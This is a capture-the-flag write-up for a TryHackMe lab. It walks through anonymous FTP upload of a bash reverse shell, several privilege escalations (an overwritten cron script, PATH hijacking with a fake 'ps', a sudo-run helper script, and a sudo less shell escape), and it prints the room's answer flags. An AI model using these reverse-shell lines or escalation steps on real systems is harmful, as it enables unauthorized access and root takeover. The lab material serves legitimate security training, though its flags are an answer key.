# [TryHackMe | Jump](https://tryhackme.com/room/jump) Challenge Room Solution Writeup

### What is the flag found in the recon_user’s home directory?

Begin by scanning TARGET_IP with `nmap`.

```bash
root@ip-ATTACKER_IP:~# nmap -sV -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds
```

There is an open `FTP` server, check if it supports anonymous login.

```bash
root@ip-ATTACKER_IP:~# ftp TARGET_IP
Connected to TARGET_IP.
220 (vsFTPd 3.0.5)
Name (TARGET_IP:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

It does. Now begin exploration to find and get the `README.txt` file.

```bash
ftp> ls
    229 Entering Extended Passive Mode (|||19343|)
    150 Here comes the directory listing.
    drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming
    drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
    226 Directory send OK.
ftp> cd pub
    250 Directory successfully changed.
ftp> ls
    229 Entering Extended Passive Mode (|||22471|)
    150 Here comes the directory listing.
    -rw-r--r--    1 0        0             139 Feb 02  2026 README.txt
    drwxr-xr-x    2 115      123          4096 Feb 01  2026 archive
    drwxrwxrwx    2 115      123          4096 Feb 01  2026 uploads
    226 Directory send OK.
ftp> get README.txt
    local: README.txt remote: README.txt
    229 Entering Extended Passive Mode (|||27513|)
    150 Opening BINARY mode data connection for README.txt (139 bytes).
    100% |*************************************************************|   139      483.06 KiB/s    00:00 ETA
    226 Transfer complete.
    139 bytes received in 00:00 (126.62 KiB/s)
```

Examine its contents.

```bash
root@ip-ATTACKER_IP:~# cat README.txt 
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

It appears that a reverse shell script may run automatically, granting a foothold into the server. Create a simple reverse shell. 

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
```

Now upload it.

```bash
ftp> put shell.sh /incoming/shell.sh
    local: shell.sh remote: /incoming/shell.sh
    229 Entering Extended Passive Mode (|||50489|)
    150 Ok to send data.
    100% |***********************************|    56      759.54 KiB/s    00:00 ETA
    226 Transfer complete.
    56 bytes sent in 00:00 (80.18 KiB/s)
```

Start a listener with `nc` and stabilize the shell. 

```bash
root@ip-ATTACKER_IP:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on TARGET_IP 36258
bash: cannot set terminal process group (1854): Inappropriate ioctl for device
bash: no job control in this shell
recon_user@tryhackme-2404:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
recon_user@tryhackme-2404:~$ ^Z
[1]+  Stopped                 nc -lvnp 4444
root@ip-ATTACKER_IP:~# stty raw -echo; fg
nc -lvnp 4444
             export TERM=xterm
```

Begin reconnaissance.

```bash
recon_user@tryhackme-2404:~$ whoami
recon_user
recon_user@tryhackme-2404:~$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
recon_user@tryhackme-2404:~$ ls -l
total 8
-rw-r--r-- 1 recon_user recon_user 42 Apr 26 19:39 flag.txt
-rw-rw-r-- 1 recon_user recon_user 55 Feb  2  2026 shell.sh
recon_user@tryhackme-2404:~$ cat flag.txt
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

Retrieve the `recon_user` flag **THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}**.

### What is the flag found in the dev_user’s home directory?

Continue exploring and recall that the `recon_user` possesses `dev_user` group privileges. 

```bash
recon_user@tryhackme-2404:~$ cd ..
recon_user@tryhackme-2404:/home$ ls -l
total 20
drwxr-x--- 3 dev_user     dev_user     4096 Jun  9 09:04 dev_user
drwxr-x--- 2 monitor_user monitor_user 4096 Apr 26 19:41 monitor_user
drwxr-x--- 2 ops_user     ops_user     4096 Apr 26 19:39 ops_user
drwxr-x--- 3 recon_user   recon_user   4096 Oct 23 16:12 recon_user
drwxr-xr-x 5 ubuntu       ubuntu       4096 Jun 21 09:50 ubuntu
recon_user@tryhackme-2404:/home$ ls -l dev_user/
total 4
-rw-r--r-- 1 dev_user dev_user 42 Apr 26 19:39 flag.txt
recon_user@tryhackme-2404:/home$ cat dev_user/flag.txt 
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

Retrieve the `dev_user` flag **THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}**.

### What is the flag found in the monitor_user’s home directory?

This is as far as one can go with `recon_user` privileges. The next target is `monitor_user`, so perform some related searches. 

```bash
recon_user@tryhackme-2404:/home$ find / -path /proc -prune -o -type f -user monitor_user -print 2>/dev/null
/sys/fs/cgroup/system.slice/healthcheck.service/memory.pressure
/opt/app/deploy_helper.sh
/usr/local/bin/healthcheck
/var/log/monitor.log
```

`healthcheck` sounds like it could be useful, investigate it further. 

```bash
recon_user@tryhackme-2404:/home$ ls -l /usr/local/bin/healthcheck 
-rwxr-xr-x 1 monitor_user monitor_user 98 Apr 29 10:35 /usr/local/bin/healthcheck
recon_user@tryhackme-2404:/home$ cat /usr/local/bin/healthcheck
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
recon_user@tryhackme-2404:/home$ grep -R "healthcheck" /etc/cron* /etc/systemd/system 2>/dev/null
/etc/systemd/system/healthcheck.service:ExecStart=/usr/local/bin/healthcheck
/etc/systemd/system/timers.target.wants/healthcheck.timer:Description=Run healthcheck every minute
/etc/systemd/system/healthcheck.timer:Description=Run healthcheck every minute
recon_user@tryhackme-2404:/home$ cat /etc/systemd/system/healthcheck.service 
[Unit]
Description=System Health Check
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
recon_user@tryhackme-2404:/home$ ls -l /opt/dev/bin/*
-rw-rw-r-- 1 dev_user dev_user 62 Apr 26 18:19 /opt/dev/bin/ps
```

`healthcheck` runs every minute and has a dependency on `ps`. `dev_user` owns a file by this name, which may be exploited via priority in the `Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin` logic. The path of escalation necessarily follows `recon_user` -> `dev_user` -> `monitor_user`. The next target is `dev_user`, so perform some related searches. 

```bash
recon_user@tryhackme-2404:/home$ find / -path /proc -prune -o -type f -user dev_user -print 2>/dev/null
/tmp/recon_backup.tgz
/opt/dev/backup.sh
/opt/dev/bin/ps
/home/dev_user/flag.txt
/home/dev_user/.profile
/home/dev_user/.bashrc
/home/dev_user/.selected_editor
/home/dev_user/.bash_logout
```

`backup.sh` sounds like it could be useful, investigate it further. 

```bash
recon_user@tryhackme-2404:/home$ ls -l /opt/dev/backup.sh 
-rwxrwxr-x 1 dev_user dev_user 44 Oct 23 15:57 /opt/dev/backup.sh
recon_user@tryhackme-2404:/home$ cat /opt/dev/backup.sh
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

Trying `grep -R "backup" /etc/cron* /etc/systemd/system 2>/dev/null` doesn't return anything of value like it did with `healthcheck`, however a few calls of `ls -l /tmp/recon_backup.tgz` reveal that it updates every minute. Replace the `backup.sh` file contents with a simple reverse shell.

```bash
recon_user@tryhackme-2404:/home$ echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1' > /opt/dev/backup.sh
```

Start a listener with `nc` and stabilize the shell. 

```bash
root@ip-ATTACKER_IP:~# nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on TARGET_IP 60440
bash: cannot set terminal process group (2275): Inappropriate ioctl for device
bash: no job control in this shell
dev_user@tryhackme-2404:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
dev_user@tryhackme-2404:~$ ^Z
[1]+  Stopped                 nc -lvnp 4445
root@ip-ATTACKER_IP:~# stty raw -echo; fg
nc -lvnp 4445
             export TERM=xterm
```

Confirm successfull escalation from `recon_user` to `dev_user`. 

```bash
dev_user@tryhackme-2404:~$ whoami
dev_user
dev_user@tryhackme-2404:~$ id
uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user),1005(devops)
dev_user@tryhackme-2404:~$ ls -l
total 4
-rw-r--r-- 1 dev_user dev_user 42 Apr 26 19:39 flag.txt
```

No additional privileges found as with `recon_user`, and the flag has already been captured here. Replace the `ps` file contents with a simple reverse shell and add execute permission so it runs when called by `healthcheck`.

```bash
dev_user@tryhackme-2404:~$ chmod +x /opt/dev/bin/ps
dev_user@tryhackme-2404:~$ ls -l /opt/dev/bin/ps
-rwxrwxr-x 1 dev_user dev_user 62 Apr 26 18:19 /opt/dev/bin/ps
dev_user@tryhackme-2404:~$ echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4446 0>&1' > /opt/dev/bin/ps
```

Start a listener with `nc` and stabilize the shell. 

```bash
root@ip-ATTACKER_IP:~# nc -lvnp 4446
Listening on 0.0.0.0 4446
Connection received on TARGET_IP 38284
bash: cannot set terminal process group (603): Inappropriate ioctl for device
bash: no job control in this shell
monitor_user@tryhackme-2404:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
monitor_user@tryhackme-2404:/$ ^Z
[1]+  Stopped                 nc -lvnp 4446
root@ip-ATTACKER_IP:~# stty raw -echo; fg
nc -lvnp 4446
             export TERM=xterm
```

Confirm successful escalation from `dev_user` to `monitor_user`. 

```bash
monitor_user@tryhackme-2404:/$ whoami
monitor_user
monitor_user@tryhackme-2404:/$ id
uid=1003(monitor_user) gid=1003(monitor_user) groups=1003(monitor_user)
monitor_user@tryhackme-2404:~$ ls /home/monitor_user/
flag.txt
monitor_user@tryhackme-2404:~$ cat /home/monitor_user/flag.txt 
THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
```

Retrieve the `monitor_user` flag **THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}**.

### What is the flag found in the ops_user’s home directory?

Investigate `monitor_user` `sudo` privileges. 

```bash
monitor_user@tryhackme-2404:/$ sudo -l
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

`deploy.sh` sounds like it could be useful, investigate it further. 

```bash
monitor_user@tryhackme-2404:/$ cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
monitor_user@tryhackme-2404:/$ ls -l /opt/app/*
-rwxr-xr-x 1 monitor_user monitor_user   90 Feb  2  2026 /opt/app/deploy_helper.sh
/opt/app/data:
total 0
monitor_user@tryhackme-2404:/$ cat /opt/app/deploy_helper.sh
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2
```

`deploy.sh` has a dependency on the `deploy_helper.sh` file owned by `monitor_user`. Replace the `deploy_helper.sh` file contents with a simple reverse shell and run it with `sudo` privileges as `ops_user`.

```bash
monitor_user@tryhackme-2404:/$ echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4447 0>&1' > /opt/app/deploy_helper.sh
monitor_user@tryhackme-2404:/$ sudo -u ops_user ./usr/local/bin/deploy.sh 
```

Start a listener with `nc` and stabilize the shell. 

```bash
root@ip-10-66-105-141:~# nc -lvnp 4447
Listening on 0.0.0.0 4447
Connection received on 10.66.164.187 46662
ops_user@tryhackme-2404:/opt/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ops_user@tryhackme-2404:/opt/app$ ^Z
[1]+  Stopped                 nc -lvnp 4447
root@ip-10-66-105-141:~# stty raw -echo; fg
nc -lvnp 4447
             export TERM=xterm
```

Confirm successful escalation from `monitor_user` to `ops_user`. 

```bash
ops_user@tryhackme-2404:/opt/app$ whoami
ops_user
ops_user@tryhackme-2404:/opt/app$ id
uid=1004(ops_user) gid=1004(ops_user) groups=1004(ops_user)
ops_user@tryhackme-2404:/opt/app$ ls -l /home/ops_user/*
-rw-r--r-- 1 ops_user ops_user 42 Apr 26 19:39 /home/ops_user/flag.txt
ops_user@tryhackme-2404:/opt/app$ cat /home/ops_user/flag.txt 
THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}
```

Retrieve the `ops_user` flag **THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}**.

### What is the flag found in the root user's home directory?

Investigate `ops_user` `sudo` privileges. 

```bash
ops_user@tryhackme-2404:/opt/app$ sudo -l
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

`less` may be run as `root`. Within its interactive mode, commands preceded by `!` will be run as `root`. Use this to spawn a shell. 

```bash
ops_user@tryhackme-2404:/opt/app$ sudo -u root /usr/bin/less /etc/hosts
!/bin/bash
```

Confirm successful escalation from `ops_user` to `root`. 

```bash
root@tryhackme-2404:/opt/app# whoami
root
root@tryhackme-2404:/opt/app# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:/opt/app# ls -l ~/
total 8
-rw-r--r-- 1 root root   42 Apr 26 19:39 flag.txt
drwxr-xr-x 4 root root 4096 Oct 22  2024 snap
root@tryhackme-2404:/opt/app# cat ~/flag.txt 
THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
```

Retrieve the `root` flag **THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}**.